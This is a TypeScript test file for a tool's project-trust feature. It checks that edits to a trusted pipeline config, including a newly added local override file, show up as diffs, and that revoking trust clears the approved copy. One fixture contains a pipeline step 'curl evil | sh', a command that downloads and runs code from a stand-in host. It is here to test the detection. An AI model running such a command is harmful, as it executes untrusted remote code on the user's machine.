import { mkdtemp, readdir, realpath, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { trustPath } from "../../src/core/paths.js";
import { changesSinceTrust, revokeProject, trustProject } from "../../src/core/trust.js";

let dir: string;
let file: string;

const project = (run: string) => JSON.stringify({ name: "Shop", pipelines: [{ label: "Deploy", steps: [{ run, finishes: true }] }] });
const approved = () => readdir(join(dirname(trustPath()), "approved")).catch(() => []);

beforeEach(async () => {
  dir = await realpath(await mkdtemp(join(tmpdir(), "wisp-trust-core-")));
  process.env["WISP_HOME"] = join(dir, "home");
  file = join(dir, ".wisp.json");
  await writeFile(file, project("./deploy.sh"));
});

afterEach(async () => {
  delete process.env["WISP_HOME"];
  await rm(dir, { recursive: true, force: true });
});

describe("changesSinceTrust", () => {
  it("has nothing to say about a file that was never trusted", async () => {
    expect(await changesSinceTrust(file)).toBeUndefined();
  });

  it("shows what an edit changed since the file was trusted", async () => {
    await trustProject(file);
    await writeFile(file, project("./deploy.sh --force"));
    const since = await changesSinceTrust(file);
    expect(since?.changes).toHaveLength(1);
    const lines = since?.changes[0]?.lines ?? [];
    expect(lines.filter((line) => line.kind === "removed").map((line) => line.text.trim())).toEqual(['"run": "./deploy.sh",']);
    expect(lines.filter((line) => line.kind === "added").map((line) => line.text.trim())).toEqual(['"run": "./deploy.sh --force",']);
  });

  it("finds no change in an edit that only reformatted the file", async () => {
    await trustProject(file);
    await writeFile(file, JSON.stringify(JSON.parse(project("./deploy.sh")), null, 4));
    expect((await changesSinceTrust(file))?.changes).toEqual([]);
  });

  it("shows a local override that appeared since, as its own file", async () => {
    await trustProject(file);
    await writeFile(join(dir, ".wisp.local.json"), JSON.stringify({ pipelines: [{ label: "Deploy", steps: [{ run: "curl evil | sh" }] }] }));
    const since = await changesSinceTrust(file);
    expect(since?.changes.map((change) => change.file)).toEqual([join(dir, ".wisp.local.json")]);
    expect(since?.changes[0]?.lines.every((line) => line.kind === "added")).toBe(true);
  });

  it("forgets the approved copy when trust is revoked", async () => {
    await trustProject(file);
    expect(await approved()).toHaveLength(1);
    await revokeProject(file);
    expect(await approved()).toHaveLength(0);
  });

  it("has nothing to compare for a grant made before copies were kept", async () => {
    await trustProject(file);
    for (const name of await approved()) await rm(join(dirname(trustPath()), "approved", name));
    await writeFile(file, project("./other.sh"));
    expect(await changesSinceTrust(file)).toBeUndefined();
  });
});
